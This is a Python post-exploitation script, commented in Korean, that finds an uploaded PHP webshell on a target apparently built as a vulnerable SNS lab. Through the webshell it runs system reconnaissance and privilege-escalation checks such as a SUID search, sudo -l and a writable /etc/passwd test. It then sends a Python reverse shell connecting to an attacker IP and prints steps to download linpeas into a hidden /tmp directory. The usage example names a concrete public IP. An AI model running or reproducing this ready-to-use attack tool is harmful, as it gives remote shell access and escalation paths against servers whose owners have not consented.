#!/usr/bin/env python3
"""
웹쉘 후속 공격 스크립트
웹쉘을 통해 Reverse Shell 획득 및 정보 수집

사용법: python3 post_exploit.py <TARGET_IP> <ATTACKER_IP> <ATTACKER_PORT>
"""

import requests
import sys
import time
import base64
from urllib.parse import quote

class PostExploiter:
    def __init__(self, target_ip, attacker_ip, attacker_port):
        self.target_ip = target_ip
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.webshell_url = None
        self.session = requests.Session()

    def find_webshell(self):
        """업로드된 웹쉘 찾기"""
        print("[*] 웹쉘 찾는 중...")

        # auto.py에서 업로드된 웹쉘 경로 예측
        possible_paths = [
            f"http://{self.target_ip}/uploads/shell.php",
            f"http://{self.target_ip}/uploads/avatar_shell.php",
            f"http://{self.target_ip}/vulnerable-sns/www/uploads/shell.php",
        ]

        for path in possible_paths:
            try:
                resp = self.session.get(path, timeout=5)
                if resp.status_code == 200 and ("cmd" in resp.text or "shell" in resp.text.lower()):
                    self.webshell_url = path
                    print(f"[+] 웹쉘 발견: {path}")
                    return True
            except:
                continue

        print("[-] 웹쉘을 찾을 수 없습니다. auto.py를 먼저 실행하세요.")
        return False

    def execute_command(self, cmd):
        """웹쉘을 통해 명령 실행"""
        if not self.webshell_url:
            return None

        try:
            params = {'cmd': cmd}
            resp = self.session.get(self.webshell_url, params=params, timeout=10)
            return resp.text
        except Exception as e:
            print(f"[-] 명령 실행 실패: {e}")
            return None

    def gather_system_info(self):
        """시스템 정보 수집"""
        print("\n" + "="*60)
        print("시스템 정보 수집")
        print("="*60)

        commands = {
            "사용자": "whoami",
            "호스트명": "hostname",
            "OS 정보": "cat /etc/os-release | head -3",
            "커널 버전": "uname -a",
            "현재 디렉토리": "pwd",
            "실행 중인 서비스": "ps aux | grep -E '(apache|nginx|postgres|mysql)' | grep -v grep",
        }

        for desc, cmd in commands.items():
            print(f"\n[*] {desc}:")
            result = self.execute_command(cmd)
            if result:
                print(result.strip())

        print("\n" + "="*60)

    def check_privilege_escalation_vectors(self):
        """권한 상승 벡터 확인"""
        print("\n" + "="*60)
        print("권한 상승 벡터 검사")
        print("="*60)

        checks = {
            "SUID 바이너리": "find / -perm -4000 -type f 2>/dev/null | head -20",
            "Sudo 권한": "sudo -l 2>/dev/null || echo 'sudo 불가능'",
            "Writable /etc/passwd": "test -w /etc/passwd && echo 'WRITABLE!' || echo 'Not writable'",
            "Cron jobs": "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null",
            "Kernel version": "uname -r",
        }

        for desc, cmd in checks.items():
            print(f"\n[*] {desc}:")
            result = self.execute_command(cmd)
            if result:
                print(result.strip())

        print("\n" + "="*60)

    def setup_reverse_shell(self):
        """Reverse Shell 설정"""
        print("\n" + "="*60)
        print("Reverse Shell 설정")
        print("="*60)

        print(f"\n[*] 공격자 IP: {self.attacker_ip}:{self.attacker_port}")
        print("[*] 로컬에서 다음 명령으로 리스너 시작:")
        print(f"    nc -lvnp {self.attacker_port}")

        input("\n[!] 리스너를 시작한 후 Enter를 누르세요...")

        # Python reverse shell
        reverse_shell_cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.attacker_ip}\",{self.attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"

        print(f"\n[*] Reverse Shell 실행 중...")
        print(f"[*] 명령: {reverse_shell_cmd}")

        # 백그라운드로 실행
        result = self.execute_command(f"{reverse_shell_cmd} &")

        print("\n[+] Reverse Shell 페이로드 전송 완료!")
        print("[*] 로컬 터미널에서 연결을 확인하세요.")
        print("\n[*] 연결 후 다음 명령 실행:")
        print("    python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
        print("    export TERM=xterm")

    def download_privilege_escalation_script(self):
        """권한 상승 스크립트 다운로드"""
        print("\n" + "="*60)
        print("권한 상승 스크립트 준비")
        print("="*60)

        # 권한 상승 스크립트를 타겟에 다운로드
        print("\n[*] 다음 명령들을 Reverse Shell에서 실행하세요:\n")

        print("# 1. 작업 디렉토리 생성")
        print("mkdir -p /tmp/.work && cd /tmp/.work")

        print("\n# 2. LinPEAS 다운로드 (권한 상승 벡터 자동 검사)")
        print("wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh")
        print("chmod +x linpeas.sh")
        print("./linpeas.sh | tee linpeas_output.txt")

        print("\n# 3. 수동 확인")
        print("sudo -l")
        print("find / -perm -4000 -type f 2>/dev/null")
        print("cat /etc/crontab")
        print("cat /etc/passwd | grep -v nologin")

        print("\n" + "="*60)

    def run(self):
        """전체 실행"""
        print("="*60)
        print("POST-EXPLOITATION FRAMEWORK")
        print("="*60)

        if not self.find_webshell():
            return False

        # 1. 시스템 정보 수집
        self.gather_system_info()

        # 2. 권한 상승 벡터 확인
        self.check_privilege_escalation_vectors()

        # 3. Reverse Shell 선택
        print("\n" + "="*60)
        print("다음 단계 선택")
        print("="*60)
        print("1. Reverse Shell 획득 (추천)")
        print("2. 웹쉘 계속 사용")
        print("3. 종료")

        choice = input("\n선택 (1-3): ").strip()

        if choice == "1":
            self.setup_reverse_shell()
            self.download_privilege_escalation_script()
        elif choice == "2":
            print("\n[*] 웹쉘 URL:", self.webshell_url)
            print("[*] 수동으로 명령을 실행하세요.")

        print("\n[+] Post-exploitation 완료!")
        return True


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("사용법: python3 post_exploit.py <TARGET_IP> <ATTACKER_IP> <ATTACKER_PORT>")
        print("예: python3 post_exploit.py 15.164.95.252 $(hostname -I | awk '{print $1}') 4444")
        sys.exit(1)

    target_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = int(sys.argv[3])

    exploiter = PostExploiter(target_ip, attacker_ip, attacker_port)
    exploiter.run()
